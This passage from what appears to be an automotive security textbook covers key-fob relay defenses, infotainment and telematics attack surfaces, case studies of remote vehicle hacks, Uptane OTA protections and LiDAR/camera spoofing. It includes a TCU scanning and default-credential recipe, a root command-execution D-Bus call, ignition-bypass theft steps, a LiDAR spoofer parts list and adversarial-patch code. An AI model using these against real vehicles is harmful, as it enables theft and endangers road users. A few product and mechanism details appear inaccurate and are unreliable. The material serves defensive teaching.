Ultra-Wideband (UWB, IEEE 802.15.4z) Time-of-Flight ranging measures the round-trip time of a challenge-response exchange at sub-nanosecond resolution. A UWB pulse has a bandwidth of 500 MHz or more, enabling ranging precision of approximately 10 cm. For a legitimate proximity check (fob within 2 meters), the round-trip time of flight is approximately 13 nanoseconds (the speed of light covers 2 m in ~6.7 ns, round-trip ~13.4 ns). A relay attack introduces additional propagation delay and processing latency — typically microseconds (thousands of nanoseconds), three orders of magnitude above the UWB detection threshold. UWB distance bounding is relay-resistant by the physical constraint of signal propagation speed.

The CCC (Car Connectivity Consortium) Digital Key 3.0 specification mandates UWB for secure ranging combined with BLE for communication and cryptographic key exchange. Production vehicle deployments: BMW iX and 7-series (2022+), Volkswagen ID.4 (2023+), Hyundai Ioniq 5 and Genesis GV60 (2023+), with Apple Car Key (iPhone UWB) and Samsung SmartThings integration. The UWB ranging is complemented by BLE for initial connection setup and the cryptographic authentication exchange.

UWB is not invulnerable. Theoretical attacks on IEEE 802.15.4z HRP (High Rate Pulse) UWB have been explored: early detection/late commit attacks (where the attacker pre-commits to a response before receiving the full challenge, reducing the apparent round-trip time) and cicada attacks (injecting pulses that arrive earlier than the legitimate response). The IEEE 802.15.4z standard includes countermeasures — the Scrambled Timestamp Sequence (STS) randomizes the pulse pattern using a shared secret, making early detection attacks computationally infeasible without knowledge of the STS key. Production implementations with STS are considered secure against known relay and distance-reduction attacks.

### 3.5 User-level mitigations

For vehicles without UWB, user-level countermeasures provide meaningful risk reduction:

A **Faraday pouch** (a signal-blocking sleeve lined with conductive fabric, providing >60 dB attenuation across 100 kHz to 6 GHz) prevents the key fob from responding to relay challenges when not in use. The key fob must be fully enclosed — a partially-open pouch or a pouch with worn shielding material may leak enough signal for a high-sensitivity relay to capture the response. Quality Faraday pouches cost $10-20 and are available from automotive security suppliers (Defender Signal, Silent Pocket).

**Motion-sensor fobs** put the fob into sleep mode (disabling its 125 kHz receiver) after 30-60 seconds of inactivity. This prevents the most common relay-attack scenario: the fob sits motionless on a table near the owner's front door, and the near-fob relay captures the challenge signal through the wall. If the fob is in sleep mode, it does not respond, and the relay attack fails. BMW (since 2019), Jaguar Land Rover (since 2019), and Ford (since 2021) have implemented motion-sensor fobs in their key fob hardware. The motion sensor adds approximately $0.50 in component cost — a trivial expense relative to the security benefit.

**Disabling PKE via vehicle settings.** Some vehicles allow the owner to disable passive keyless entry through the infotainment settings menu, requiring the owner to press a button on the fob to unlock (reverting to traditional RKE mode). This eliminates the relay-attack vector entirely at the cost of convenience. Tesla allows this through the mobile app (Settings → Passive Entry → Off).

---

## 4. Infotainment and telematics attacks

### 4.1 IVI attack surface

The IVI (In-Vehicle Infotainment) system is the most internet-connected component in the vehicle. External interfaces: cellular (4G/5G modem in the Telematics Control Unit), Wi-Fi (passenger hotspot, wireless CarPlay/Android Auto), Bluetooth (phone pairing, audio A2DP, hands-free HFP), USB (media playback, smartphone mirroring, firmware update via USB stick), GNSS (GPS/GLONASS/Galileo for navigation), and FM/DAB/Sirius XM radio (the radio tuner's signal-processing firmware is an overlooked attack surface — a crafted RDS or DAB data stream could exploit a parsing vulnerability in the tuner MCU). Internal interfaces: CAN bus (via the gateway), Automotive Ethernet (for camera feeds, ADAS data, surround-view), and inter-process communication.

### 4.2 OS-specific architecture and vulnerabilities

**QNX (BlackBerry).** A microkernel RTOS dominant in automotive IVI and instrument clusters. The microkernel architecture means drivers, file systems, network stacks, and application services all run as user-space processes — a crash or compromise in one service does not bring down the kernel or other services. QNX Adaptive Partitioning allocates CPU time budgets to process groups. QNX Hypervisor hosts multiple guest OSes (e.g., QNX RTOS for the safety-critical instrument cluster + Android for infotainment apps) on a single SoC with hardware-enforced isolation (ARM VHE — Virtual Host Extensions). A hypervisor escape would bridge the safety-critical guest and the less-trusted infotainment guest.

Historical QNX vulnerabilities include CVE-2021-22156 (BadAlloc — integer overflow in the C runtime memory allocator affecting QNX SDP 6.6 and 7.0, potentially allowing remote code execution through a controlled allocation size). CISA issued advisory ICSA-21-315-02 for this vulnerability. Additionally, CVE-2019-8997 through CVE-2019-8999 affected QNX CAR Platform and Neutrino RTOS — information disclosure through kernel memory leaks that could aid exploitation of other vulnerabilities.

**Android Automotive OS (AAOS).** Google's in-vehicle OS running natively on the IVI SoC. The VHAL (Vehicle Hardware Abstraction Layer) is the critical security boundary:

```
// VHAL property access — Android Automotive
// The VHAL mediates all vehicle-bus access from Android user-space

// Read vehicle speed (requires android.car.permission.CAR_SPEED)
VehiclePropValue speedProp = mVehicleHal.get(VehicleProperty.PERF_VEHICLE_SPEED);
float speedMs = speedProp.value.floatValues.get(0);  // m/s

// HVAC temperature control (requires android.car.permission.CONTROL_CAR_CLIMATE)
VehiclePropValue hvacProp = new VehiclePropValue();
hvacProp.prop = VehicleProperty.HVAC_TEMPERATURE_SET;
hvacProp.areaId = VehicleAreaSeat.ROW_1_LEFT;
hvacProp.value.floatValues.add(22.0f);  // 22°C
mVehicleHal.set(hvacProp);

// If VHAL permission checks are bypassed (CVE in the HAL service),
// an unprivileged app could write to safety-critical properties:
// VehicleProperty.AP_POWER_STATE_REQ, DOOR_LOCK, IGNITION_STATE
```

SELinux mandatory access control policies confine each AAOS process to its designated role. App sandboxing isolates third-party apps. Vulnerabilities can arise from flaws in the VHAL implementation (improper property ID validation, missing permission checks), Android framework bugs (WebView, media codecs, Bluetooth stack), and overly permissive SELinux policy.

**Linux-based IVI (AGL — Automotive Grade Linux, custom Linux).** Used by Toyota, Mercedes-Benz, Subaru, and others. AGL uses SMACK (Simplified Mandatory Access Control Kernel) for MAC enforcement — SMACK labels are assigned to processes and files, and the kernel enforces access rules based on label matching (simpler than SELinux policy but sufficient for the IVI's relatively constrained process model). AGL also implements application sandboxing through a combination of cgroups (resource limits), namespaces (filesystem and network isolation), and seccomp-bpf (syscall filtering).

The full Linux kernel attack surface (Chapter 5) applies to Linux-based IVI systems — kernel exploits, driver vulnerabilities, and privilege-escalation techniques are all relevant. IVI-specific Linux attack surface includes: custom kernel modules for CAN bus access (loaded to provide SocketCAN interfaces — vulnerabilities in these modules grant direct bus access), multimedia codecs (hardware-accelerated video decoders often run in kernel space or in a privileged user-space process with DMA access), and connectivity drivers (Wi-Fi, Bluetooth, and cellular modem drivers that parse untrusted radio-layer data).

The AGL security framework defines four security domains within the IVI: Platform (core OS services), Framework (AGL application framework and bindings), App (third-party applications from the app store), and Connectivity (network-facing services). Cross-domain communication is mediated by AGL's binding mechanism (a D-Bus-like IPC with access-control tokens). A compromised App-domain process should not be able to directly invoke Platform-domain services that access the CAN bus — but the effectiveness of this isolation depends on correct SMACK policy configuration and binding permission enforcement.

### 4.3 Telematics Control Unit (TCU) cellular exploitation

The TCU provides the vehicle's cellular connectivity — a cellular modem (Qualcomm MDM/SDX or Samsung Exynos Auto), SIM/eSIM, and an application processor. The TCU connects to the cellular network and provides data services to the IVI.

The TCU is directly reachable from the cellular network. In the Jeep Cherokee attack, the Harman TCU was assigned a public IP address on the Sprint network. More broadly, TCU attack vectors include: cellular baseband vulnerabilities (buffer overflows exploitable via crafted cellular signaling — similar to Weinmann's Qualcomm baseband exploits), SMS processing vulnerabilities (crafted SMS triggering code execution on the application processor), and exposed management interfaces (carrier provisioning ports accessible from the cellular network).

The Computest team disclosed in 2018 that the Volkswagen/Audi MIB II infotainment system's TCU (Harman) had an exposed network service accessible via cellular. Exploiting it gave code execution on the TCU, from which they pivoted to the IVI (shared internal Ethernet) and ultimately to the CAN bus. The researchers documented the entire lateral-movement chain: TCU → internal Ethernet (shared subnet, no segmentation between TCU and IVI) → IVI root access (the IVI's internal SSH service accepted connections from the TCU's IP without additional authentication) → CAN bus access via the IVI's SPI-connected CAN transceiver.

A generalized TCU reconnaissance approach (assuming cellular network access to the target):

```bash
# Step 1: Identify TCU's cellular IP (varies by carrier/market)
# Some TCUs respond to ICMP; others expose HTTP/HTTPS on management ports
nmap -sV -p 22,80,443,6667,8080,8443 <target_TCU_IP_range>

# Step 2: Fingerprint exposed services
# Look for: D-Bus (port 6667), SSH (port 22), HTTP management consoles,
# MQTT brokers (port 1883/8883), diagnostic services (proprietary ports)

# Step 3: Check for known TCU firmware versions
# TCU management pages often expose firmware version strings
curl -s http://<TCU_IP>:8080/status | grep -i "firmware\|version\|model"

# Step 4: If SSH is exposed, attempt default credentials
# (some TCUs ship with hardcoded maintenance accounts)
# NOTE: This requires authorized scope — pentest engagement only
```

The cellular attack surface is expanding as vehicles add eSIM-based connectivity, 5G modems (which expose additional control-plane attack surface through NAS signaling), and cloud-connected services (remote start, remote climate, remote diagnostics) that establish persistent TCP connections to OEM backend servers. Each persistent connection is a potential entry point if the backend is compromised or if the TLS implementation is flawed.

### 4.4 Attack chain: external interface to vehicle control

The recurring pattern: **Internet-facing interface** (cellular, Wi-Fi, Bluetooth, USB) → **IVI/TCU compromise** (browser vuln, media parser, Bluetooth stack, D-Bus service) → **privilege escalation** (sandbox escape to root/system within the IVI OS) → **CAN gateway access** (the IVI/TCU has a CAN or Ethernet connection to the gateway) → **cross-domain injection** (if the gateway doesn't filter infotainment-origin messages) → **vehicle control** (braking, steering, transmission, door locks, engine).

Defense-in-depth along this chain: harden each external interface (disable unused services, apply least-privilege network configs), sandbox IVI applications (microkernel, hypervisor, SELinux/SMACK), enforce strict gateway filtering (whitelist-only from infotainment to safety-critical buses), apply SecOC on safety-critical CAN messages, and deploy intrusion detection at both IVI and gateway levels.

---

## 5. Remote attack case studies

### 5.1 Jeep Cherokee — Miller and Valasek (2015)

Charlie Miller and Chris Valasek disclosed the most consequential remote vehicle attack to date at Black Hat USA 2015. Target: a 2014 Jeep Cherokee with the Uconnect IVI system manufactured by Harman International, running QNX on an OMAP (TI) processor.

**Kill chain.** (1) The Uconnect system's TCU was connected to the Sprint cellular network. Critically, the TCU was assigned a publicly routable IP address (in the Sprint 21.0.0.0/8 range). The researchers discovered that the D-Bus IPC message bus — used for internal communication between IVI services — was listening on TCP port 6667, accessible from the cellular network without authentication. By scanning the Sprint IP range, they could fingerprint Uconnect-equipped vehicles and determine their VIN, GPS coordinates, and IP address. (2) They exploited the unauthenticated D-Bus service. The `execute` method on the D-Bus interface accepted arbitrary shell commands:

```
# Conceptual D-Bus exploitation (simplified)
# Attacker connects to TCU_IP:6667 and invokes D-Bus method

dbus-send --system --type=method_call \
  --dest=com.harman.service.SYSCommander \
  /com/harman/service/SYSCommander \
  com.harman.ServiceIpc.invoke \
  string:'execute' \
  string:'{"cmd":"id"}'

# Response: uid=0(root) — unauthenticated root command execution
```

(3) From the IVI (running as root on QNX), they accessed the CAN bus. The IVI had a direct SPI connection to a CAN transceiver attached to the vehicle's internal CAN bus. The gateway did not filter diagnostic UDS messages originating from the IVI — any UDS service ID could be sent from the IVI to any ECU. (4) They used UDS commands to reflash the Renesas V850ES microcontroller in the Electronic Power Steering (EPS) module. The V850's SecurityAccess algorithm was reverse-engineered (from firmware extracted via JTAG), and the security seed-key challenge could be computed in real-time. After flashing modified firmware onto the V850, the EPS accepted arbitrary steering-torque commands via CAN. (5) They demonstrated: steering wheel turning (at low speed, the EPS applied torque per CAN command), braking (engaging the electronic parking brake at any speed, and manipulating ABS actuators), transmission shift (commanding a shift to neutral at highway speed), dashboard manipulation, horn/headlights activation, and engine kill.

**Impact.** Chrysler (FCA) recalled 1.4 million vehicles (NHTSA recall 15V-461). Sprint blocked the vulnerable port at the carrier level. Chrysler deployed a firmware update closing the D-Bus exposure and hardening gateway filtering. The incident led directly to the US NHTSA issuing its first cybersecurity best practices guidance for the automotive industry.

### 5.2 Tesla — Keen Security Lab (2016, 2017, 2019, 2020)

The Tencent Keen Security Lab conducted a multi-year attack series against Tesla vehicles, each demonstrating remote-to-CAN compromise and each met by Tesla with incremental hardening.

**2016 attack (CVE-2016-9862 through CVE-2016-9864, Tesla Model S firmware < 7.1 2016.36.0).** The CID (Central Information Display) runs a customized Ubuntu Linux with a WebKit-based browser. The kill chain: (1) The researchers set up a malicious Wi-Fi network with a captive portal; when the Tesla's browser navigated to the portal (either automatically during Wi-Fi connection or via user interaction), they exploited a WebKit vulnerability (CVE-2016-9862 — a use-after-free in the browser rendering engine) to gain code execution within the browser process. (2) They escalated from the browser sandbox to root on the CID via a Linux kernel vulnerability (CVE-2016-9863 — a local privilege escalation in the Linux kernel). (3) From the CID with root access, they reflashed the gateway ECU's firmware. The gateway accepted firmware updates from the CID without cryptographic verification (CVE-2016-9864) — the CID had a CAN/SPI connection to the gateway and could issue firmware-write commands that the gateway accepted without checking a digital signature. (4) With a compromised gateway, they had unrestricted access to all vehicle CAN buses. They demonstrated: remote braking (activating the braking system via CAN from 12 miles away over the cellular network), door unlock, mirror fold, trunk open, and dashboard manipulation.

**Tesla's response.** Code-signing for gateway firmware (RSA signature verification against Tesla's public key before accepting any flash). CAN message filtering on the gateway (restricting which IDs the CID can originate). Linux kernel hardening on the CID (KASLR, seccomp-bpf, reduced syscall surface). Bug bounty payout to Keen Lab.

**2017.** Keen Lab bypassed the 2016 mitigations. They found a new browser vulnerability, escalated to CID root via a different kernel path, and exploited a flaw in the gateway's newly-added code-signing verification (an implementation error in the signature check logic that allowed a crafted firmware image to pass validation). Tesla patched the code-signing implementation and further restricted the CID's CAN interface. These findings were presented at Black Hat USA 2017.

**2019-2020.** Keen Lab shifted focus to the Autopilot ECU (APE), demonstrating adversarial attacks against the lane-detection neural network (causing the vehicle to steer into oncoming traffic by placing adversarial markings on the road) and exploiting the APE's firmware update mechanism.

### 5.3 BMW ConnectedDrive — ADAC (2015)

The ADAC discovered that BMW's ConnectedDrive telematics used a fundamentally broken TLS implementation. The vehicles communicated with BMW's backend servers over cellular data, but instead of standard TLS with per-vehicle certificates, the connection used a static, shared symmetric key embedded in the TCU firmware. This key was identical across all BMW vehicles of the same model generation. An attacker who extracted the key (via firmware analysis of any single vehicle's TCU) could MitM the ConnectedDrive communication of any vehicle using the same key.

The ADAC demonstrated the attack by positioning a rogue cellular base station (IMSI catcher) near the target vehicle, intercepting the ConnectedDrive traffic, and using the extracted symmetric key to decrypt and modify commands in transit. They successfully issued: remote door unlock, remote door lock, remote climate control activation, and vehicle status queries — all without physical access to the vehicle. Approximately 2.2 million BMW, Mini, and Rolls-Royce vehicles were affected.

The root cause was a design decision to optimize for deployment simplicity over security: a single symmetric key per model generation meant that BMW's backend did not need to manage per-vehicle certificates, and the TCU did not need a full TLS stack with certificate validation. This saved approximately $2 of BOM cost per vehicle (for a hardware crypto accelerator that could handle per-vehicle asymmetric key operations) and simplified the manufacturing provisioning process. The tradeoff proved catastrophic: extracting the symmetric key from one vehicle (via firmware dump from the TCU's flash memory using JTAG) compromised the entire fleet.

BMW's fix: an OTA update that replaced the symmetric-key scheme with proper TLS using per-vehicle X.509 certificates (generated during manufacturing and provisioned into the TCU's secure element), HTTPS with certificate pinning to BMW's backend CA (preventing MitM even if a rogue CA issued a certificate), and certificate rotation capability (allowing BMW to roll credentials without a physical recall). The fix required a hardware security module (which was already present in the TCU but unused for this communication path) to store the per-vehicle private key.

### 5.4 Mercedes-Benz MBUX — Tencent Security Keen Lab (2020)

Keen Lab disclosed a chain of vulnerabilities in the Mercedes-Benz MBUX infotainment system, presented at Black Hat USA 2020. The attack targeted the T-Box (Telematics Control Unit): (1) The T-Box exposed a diagnostic-related service on the cellular interface that could be reached by an attacker on the same cellular network or via internet routing. (2) Exploiting a vulnerability in this service granted code execution on the T-Box's Linux-based OS. (3) From the T-Box, the researchers accessed the head unit via an internal Ethernet connection (the T-Box and head unit were on the same internal network segment without mutual authentication). (4) From the head unit, they accessed the CAN bus via the vehicle's central gateway. (5) They demonstrated: door lock/unlock, interior lighting control, windshield wiper activation, and diagnostic command execution against powertrain ECUs. Mercedes-Benz acknowledged the findings and deployed firmware updates addressing: the T-Box network exposure, gateway CAN filtering, and inter-component authentication (mutual TLS between the T-Box and head unit).

### 5.5 Hyundai/Kia USB ignition bypass (2022-2023)

In 2022, a TikTok-viral exploit dubbed the "Kia Boys" demonstrated a trivially simple physical attack against approximately 8.3 million Hyundai and Kia vehicles manufactured between 2011 and 2022. The affected vehicles (Hyundai Accent, Elantra, Sonata, Tucson, Santa Fe, Veloster; Kia Rio, Forte, Optima, Sorento, Sportage, Soul — primarily base and mid-trim variants sold in the North American market) lacked electronic immobilizers — a security component standard on virtually all other manufacturers since the early 2000s. The absence of an immobilizer meant the ignition could be actuated by any object that turned the mechanical ignition cylinder or bridged the ignition circuit.

**Attack method.** (1) Break the vehicle window or use a slim-jim to open the door (no electronic bypass needed — the absence of immobilizer also meant simpler door-lock mechanisms on base trims). (2) Remove the steering column cover (held by Phillips screws or plastic clips — 30 seconds with a screwdriver). (3) Locate the ignition switch assembly. In affected vehicles, the ignition switch connector used a USB-A-shaped housing. (4) Insert a USB-A cable, phone charger, or screwdriver into the connector slot and turn. The mechanical ignition engaged, the steering lock released, and the engine started. No electronic tools, no CAN bus interaction, no code — purely electro-mechanical.

**Impact.** Vehicle theft rates for affected models increased by 767% in some US cities. Chicago reported 8,956 Hyundai/Kia thefts in 2022, up from ~800 in 2020. Multiple deaths resulted from crashes involving stolen vehicles driven by inexperienced thieves. NHTSA launched investigation EA22-002 and safety campaigns 22V-894 (Kia) and 22V-893 (Hyundai). Hyundai and Kia deployed: (1) an OTA software update that extended the alarm duration and required the key fob to be present for ignition (not applicable to vehicles without push-button start), (2) a dealer-installed hardware kit (a module adding an electronic ignition immobilizer function, retrofitting the missing security component), and (3) free steering-wheel locks distributed at police departments. A class-action settlement (In re Hyundai and Kia Engine Litigation II) covered upgrade costs and stolen-vehicle claims.

This case study demonstrates that vehicle security failures are not always sophisticated electronic attacks — the absence of a basic security control (an electronic immobilizer costing under $50 per vehicle) created a vulnerability exploitable by completely unskilled attackers at scale.

---

## 6. OTA update security

### 6.1 Threat model

OTA (Over-the-Air) updates deliver firmware to ECUs without a dealership visit. The threat model: an attacker who can intercept the update package (MitM on the cellular connection), modify the package (if signing is weak), replay an old vulnerable package (rollback attack, if version enforcement is missing), serve arbitrary content from a compromised update server, cause a partial update leaving the ECU in an inconsistent state (bricking), or prevent an update from being delivered (freeze attack — serving stale metadata to convince the vehicle no update is available).

### 6.2 Uptane framework deep dive

Uptane (developed by NYU Tandon School of Engineering and the University of Michigan Transportation Research Institute, standardized as IEEE 2680-2022) is the automotive-specific secure OTA framework extending TUF (The Update Framework) with automotive-specific design: per-ECU verification, a split repository model, and resilience against partial infrastructure compromise.

**Roles.** Uptane inherits four roles from TUF, each with a dedicated signing key:

The **Root** role signs the public keys of all other roles. It is the root of trust. The Root key is kept offline (air-gapped HSM, multi-party access required — typically 3-of-5 threshold signing). Root metadata contains: the current set of trusted role keys, the threshold number of signatures required for each role, key type and algorithm (RSA-4096 or Ed25519), and an expiration date. Root metadata is rotated infrequently (annually or when a role key changes).

The **Targets** role signs the update images. Each image is listed with filename, size, and cryptographic hash (SHA-256 or SHA-512). The Targets key is the OEM's firmware-signing key. Compromise of this key alone allows the attacker to sign arbitrary firmware images but not direct them to specific vehicles.

The **Snapshot** role signs a manifest of the current metadata state — version numbers and hashes of all currently-valid Targets metadata files. This prevents mix-and-match attacks (combining legitimate but incompatible Targets metadata from different time periods).

The **Timestamp** role signs a timestamp and the hash of current Snapshot metadata. Refreshed frequently (e.g., hourly). Prevents freeze attacks: if the attacker serves old Timestamp metadata, the vehicle detects expiration and refuses to proceed.

**Metadata verification chain on the vehicle:**

```
Vehicle (Primary ECU) receives metadata from both repositories:

1. Verify Root metadata:
   - Check Root signatures (threshold: 3-of-5 Root keys)
   - Extract role keys for subsequent verification

2. Verify Timestamp metadata (from Director + Image repos):
   - Check Timestamp signature against Timestamp role key
   - Check expiration (reject if expired — freeze attack defense)
   - Extract Snapshot metadata hash

3. Verify Snapshot metadata:
   - Check hash matches Timestamp's reference
   - Check Snapshot signature against Snapshot role key
   - Extract Targets metadata version numbers

4. Verify Targets metadata (from both Director and Image repos):
   - Director Targets: maps ECU serial → image hash + version
   - Image Targets: provides image hash, size, custom metadata
   - Both must agree on the image hash for each ECU

5. Per-ECU verification:
   - Download image, verify hash against Targets metadata
   - Verify version > current version (rollback protection)
   - Verify ECU-specific compatibility metadata (hardware ID match)
   - Flash only if all checks pass
```

**Director and Image repositories.** The Image repository hosts firmware images and Targets metadata signed by the OEM's Targets key. It is content-addressed. The Director repository provides per-vehicle metadata: mapping each ECU (by serial number) to a specific image (by hash) and version. The Director's metadata is signed by the Director's Targets key (separate from the Image repository's Targets key). For an update to proceed, metadata from both repositories must be verified and must agree. A compromised Director can only direct an ECU to install an image legitimately signed by the Image repository. A compromised Image repository can sign arbitrary images but cannot direct specific vehicles to install them. Both must be compromised for a full attack.

### 6.3 Time server protocol

Uptane includes an optional time server protocol for ECUs lacking battery-backed real-time clocks (common for secondary ECUs — body control modules, window controllers, HVAC units). The primary ECU sends a nonce to the time server; the time server responds with a signed attestation containing the nonce and the current UTC time. Secondary ECUs verify the time server's signature and use the attested time for metadata expiration checks. Without a trusted time source, an attacker could manipulate the ECU's perceived time to make expired metadata appear valid.

### 6.4 Delta updates and signing

Full-image OTA updates are bandwidth-intensive (50-500 MB per ECU; 1+ GB for a full vehicle update). Delta updates transmit only the binary difference between current and target firmware, reducing bandwidth by 80-95%. Tools: bsdiff/bspatch, casync (content-addressable data synchronizer), and zstd-based differential compression.

The security requirement: the Targets metadata must contain the hash of the **full target image**, not the delta patch. The primary ECU downloads the delta, applies it to the current image, and verifies the resulting full image hash against Targets metadata. If the hash matches, the update is authentic. This ensures that even a tampered delta (which would produce a different full image) is detected. The delta is a bandwidth optimization; the cryptographic verification operates on the full image.

### 6.5 Uptane attack-mitigation mapping

Each Uptane role and mechanism defends against specific attack classes:

```
Attack                         Mitigated by              Mechanism
─────────────────────────────────────────────────────────────────────────
Arbitrary code execution       Targets role (Image repo) Only OEM-signed images accepted
                                                         (hash + signature in metadata)

Rollback to vulnerable ver.    Version monotonicity      ECU rejects version ≤ current
                               Snapshot role             Detects stale target metadata

Freeze (serve stale metadata)  Timestamp role            Short expiration (hourly);
                                                         vehicle rejects expired timestamps

Mix-and-match (incompatible    Snapshot role             Snapshot signs the set of all
metadata from different eras)                            current targets metadata together

Wrong ECU targeting            Director repository       Per-ECU mapping (serial → image)
                                                         must match Image repo targets

Partial compromise (Director)  Split-repository model    Director can only select images
                                                         already signed by Image repo

Partial compromise (Image)     Split-repository model    Image repo cannot direct specific
                                                         vehicles without Director keys

Key compromise escalation      Threshold signatures      Root requires M-of-N signatures;
                               Key rotation in Root      compromising one key insufficient

Denial of update               Timestamp expiration      Vehicle knows updates should be
                                                         available; alerts on prolonged
                                                         inability to reach fresh metadata
```

### 6.6 OTA incidents and lessons

The Jeep Cherokee recall (2015) was initially handled via physical USB-stick updates mailed to owners — a process vulnerable to supply-chain interception (an attacker could intercept USB sticks in postal transit, replace the firmware image with a backdoored version, re-seal the package, and mail it to the vehicle owner, who would then plug the compromised stick into their vehicle's USB port). Chrysler subsequently developed OTA capability to eliminate this physical-media attack vector.

Tesla has used OTA as a security response mechanism since 2016, deploying patches within days of Keen Lab's disclosures — a response speed most traditional OEMs could not match at the time. When Keen Lab disclosed the 2016 gateway vulnerability, Tesla pushed a firmware update to the entire fleet within 10 days. Traditional OEMs with no OTA capability would require a physical recall, dealer appointments, and months of remediation — leaving the vulnerability window open far longer. The time-to-patch is itself a security property: the window between disclosure and deployment represents the period of maximum fleet exposure.

The Uptane framework was adopted in production by multiple OEMs between 2019 and 2023. Implementations include: Uptane-compliant systems in vehicles from Toyota, GM (via its Ultifi platform), and multiple European OEMs. The framework's design has been validated through formal verification (TLA+ specifications of the metadata verification protocol) and through real-world deployment at scale.

---

## 7. ADAS sensor attacks

### 7.1 LiDAR spoofing and blinding

Automotive LiDAR (Velodyne VLP-16/VLP-32, Luminar Iris, Hesai AT128/Pandar, Ouster OS1/OS2, Valeo SCALA) uses pulsed laser (905 nm or 1550 nm) and time-of-flight measurement to build 3D point clouds.

**Relay/spoofing attack.** The attacker captures the LiDAR's laser pulses (with a fast avalanche photodiode — APD — detector), delays them using an FPGA-based pulse generator with a programmable delay line, and retransmits them using a laser diode matched to the LiDAR's wavelength. The LiDAR interprets the delayed pulse as a reflection from a distant object — injecting a phantom point at a controlled distance. By modulating delay across successive pulses and synchronizing to the LiDAR's scan pattern, the attacker creates a phantom object with specific shape and trajectory.

**Research timeline.** Petit et al. (2015, Black Hat Europe, "Remote Attacks on Automated Vehicles Sensors") first demonstrated LiDAR relay attacks in a laboratory setting using an IBEO LUX3 sensor. Shin et al. (2017, USENIX Security, "Illusion and Dazzle: Adversarial Optical Channel Exploits Against Lidars") advanced the attack against Velodyne VLP-16 — they demonstrated both saturation attacks (blinding with a 905 nm high-power laser) and synchronized spoofing, injecting points at arbitrary distances within the sensor's range. Their hardware: a 905 nm laser diode (1W peak), APD detector, and Xilinx FPGA for pulse timing. Cao et al. (2019, CCS, "Adversarial Objects Against LiDAR-Based Autonomous Driving Systems") demonstrated that ~100 spoofed points per scan, placed at the correct positions relative to the sensor, caused deep-learning 3D object detectors (PointPillars, PointRCNN) to classify the spoofed cluster as a vehicle or pedestrian with >80% confidence. The attack hardware consisted of a 905 nm laser diode, an APD, and a Xilinx Zynq SoC with nanosecond-precision timing.

**Blinding/saturation.** A high-power laser (at the LiDAR's wavelength) aimed at the sensor saturates the photodetector, creating a blind spot — missing data in the point cloud. A real obstacle in that region becomes invisible. Simpler than spoofing (no synchronization required), but less precise (the attacker controls absence, not fabrication).

**LiDAR spoofing hardware setup:**

```
LiDAR Spoofing Attack — Component List (Shin et al. 2017):

Signal Capture:
  - Avalanche Photodiode (APD): Hamamatsu S12023-02
    (905 nm sensitivity, 200 MHz bandwidth)
  - Transimpedance amplifier: Analog Devices AD8015
  - Bandpass filter: 905 nm ± 5 nm optical filter

Timing and Control:
  - FPGA: Xilinx Zynq-7020 (or Artix-7)
    - Measures time-of-arrival of captured pulses
    - Generates programmable delay (1 ns resolution)
    - Triggers laser emission with precise timing
  - Clock: 1 GHz reference for sub-ns timing accuracy

Signal Injection:
  - Laser diode: 905 nm, 1W peak power (OSRAM SPL PL90_3)
  - Laser driver: iC Haus iC-HKB (fast pulse driver, <5 ns rise time)
  - Collimating optics: adjustable-focus lens to direct beam at target sensor

Total cost: ~$500-1000 (research-grade prototype)
Effective range: 10-50 meters (depending on laser power and optics)
Points injected per scan: 50-200 (sufficient for phantom object detection)
```

**Defense against LiDAR attacks.** Multi-sensor fusion remains the primary defense (LiDAR + camera + RADAR — an obstacle must be confirmed by at least two sensor modalities). Temporal consistency filtering rejects phantom objects that appear and disappear between frames without a physically plausible trajectory. LiDAR-specific defenses under active research include: pulse fingerprinting (encoding a per-pulse pseudo-random signature in the laser waveform — the receiver validates the signature, rejecting pulses that don't match), randomized scan patterns (varying the angular scan rate and timing pseudo-randomly so the attacker cannot predict when the next pulse will arrive at a given angle), and photon-counting LiDAR (single-photon avalanche diode — SPAD — detectors that can distinguish the weak return signal from the strong spoofed signal based on timing resolution).

### 7.2 Camera attacks

ADAS cameras (Mobileye EyeQ, Tesla Vision, Bosch MPC3, Continental ARS) use CNNs for object detection, lane detection, traffic sign recognition, and semantic segmentation.

**Adversarial patches.** Eykholt et al. (2018, CVPR, "Robust Physical-World Attacks on Deep Learning Models") demonstrated adversarial perturbations on stop signs that caused a YOLO/Faster-RCNN classifier to misclassify the sign as a speed limit with >90% confidence. The perturbations were optimized using Expectation over Transformation (EoT) — accounting for the distribution of physical-world transformations (rotation, scale, perspective, brightness, viewing angle):

```python
# Adversarial patch generation — conceptual (PyTorch pseudocode)
# Based on Eykholt et al. EoT methodology

for epoch in range(NUM_EPOCHS):
    for transform_sample in sample_transforms(N=32):
        # Apply random physical-world transform to the patch
        transformed_patch = apply_transform(patch, transform_sample)
        # Overlay patch on clean image of stop sign
        perturbed_image = overlay(clean_sign_image, transformed_patch, position)
        # Forward pass through target detector
        prediction = model(perturbed_image)
        # Loss: maximize confidence of target class (e.g., "speed limit 45")
        #        minimize confidence of true class ("stop sign")
        loss = -log(prediction[TARGET_CLASS]) + log(prediction[TRUE_CLASS])
        loss.backward()
    # Update patch pixels via projected gradient descent
    patch = patch - lr * patch.grad.sign()
    patch = torch.clamp(patch, 0, 1)  # Keep pixel values valid
```

Patches can be printed on stickers and applied to real signs — the perturbation is inconspicuous to humans but causes systematic CNN misclassification.

**Infrared (IR) LED blinding.** An array of 850/940 nm IR LEDs (invisible to humans, detected by CMOS sensors) creates a white-out in the affected image region. Cost: under $50 for an IR LED array. Range: 10-30 meters depending on LED power and camera sensitivity.

**Rolling shutter exploitation.** Most automotive CMOS cameras use a rolling shutter (exposing row-by-row, not simultaneously). A modulated light source (pulsing at the rolling-shutter scan frequency) creates horizontal banding artifacts that confuse lane-detection and object-detection algorithms.

**Projected perturbations.** A projector overlays adversarial patterns onto real signs or road surfaces. Stealthier than physical stickers (the projection can be toggled on and off from a distance, leaving no permanent evidence) and dynamically adjustable (the adversarial pattern can be updated in real-time to target different classification models). Nassi et al. (2020, "Phantom of the ADAS: Securing Advanced Driver-Assistance Systems from Split-Second Phantom Attacks") demonstrated that a drone-mounted projector could briefly project a phantom road sign onto a building wall or road surface for a fraction of a second — long enough for the ADAS camera to capture a single frame containing the projected sign, triggering a recognition response.

